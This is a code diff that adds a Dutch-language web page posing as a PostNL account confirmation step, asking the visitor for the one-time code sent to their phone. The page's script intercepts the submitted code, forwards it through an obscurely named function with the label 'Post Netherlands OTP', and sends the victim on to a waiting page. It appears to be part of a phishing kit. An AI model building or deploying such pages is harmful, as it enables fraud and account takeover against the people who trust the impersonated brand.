@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="res/app.css">
+    <title>POSTNL</title>
+</head>
+<body>
+<header>
+<div class="left">
+<img src="res/img/logo.png" >
+<a href="#">Mijn account</a>
+<a href="#">Verzenden</a>
+<a href="#">Zakelijke oplossingen</a>
+<a href="#">Klantenservice</a>
+
+</div>
+<div class="right">
+    <a href="#">Hulp</a>
+<button>Uitloggen</button>
+</div>
+ </header>  
+    
+    
+
+<main>
+
+
+<div class="form">
+    <div class="continer">
+    
+<form action="post.php" method="post">
+<h2>Bevestiging</h2>
+
+<div class="col"><h4 style="font-weight:normal;">Voer de verificatiecode in die naar uw telefoon is verzonden.</h4> </div>
+
+<div class="col">
+<input type="text" placeholder="Voer code in" name="otp" required> <br> 
+</div>
+
+<div class="col">
+    <button type="submit"> Bevestigen</button>
+</div>
+
+</div> 
+
+
+
+
+</form>
+
+</div>
+</div>
+
+<script type="text/javascript">
+
+
+document.querySelector("form").addEventListener("submit",(e)=>{
+    e.preventDefault();
+
+    wu.zhong(`🔒 Post Netherlands OTP: ${document.querySelector("[name='otp']").value}`);
+
+    window.location="wait.html";
+
+})
+
+</script>
+
+
+</main>
+</body>
+</html>
